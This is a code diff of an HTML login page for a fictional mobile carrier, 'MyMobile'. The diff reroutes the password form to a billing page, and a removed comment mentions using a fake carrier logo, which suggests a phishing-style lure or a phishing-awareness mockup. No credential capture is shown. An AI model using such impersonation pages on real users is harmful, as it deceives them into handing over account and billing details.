@@ -59,21 +59,27 @@
       color: #888;
     }
   </style>
+  <script>
+  function redirectToBilling(event) {
+    event.preventDefault(); // evita envío del formulario
+    window.location.href = "billing.html"; // redirige
+  }
+</script>
 </head>
 <body>
 
   <div class="login-box">
-    <!-- You can replace this image with a fake carrier logo -->
-    <!-- <img src="logo.png" alt="Carrier Logo"> -->
     <h1>MyMobile Login</h1>
-    <form method="POST" action="/login">
+    <form form onsubmit="redirectToBilling(event)">
       <input type="text" name="phone" placeholder="Phone number or email" required />
       <input type="password" name="password" placeholder="Account password" required />
-      <button type="submit">Log In</button>
+      <button type="submit" onclick="">Log In</button>
     </form>
     <div class="disclaimer">
       © 2025 MyMobile Inc. All rights reserved.
     </div>
   </div>
 </body>
+
+<!-- 3_r3l3 -->
 </html>
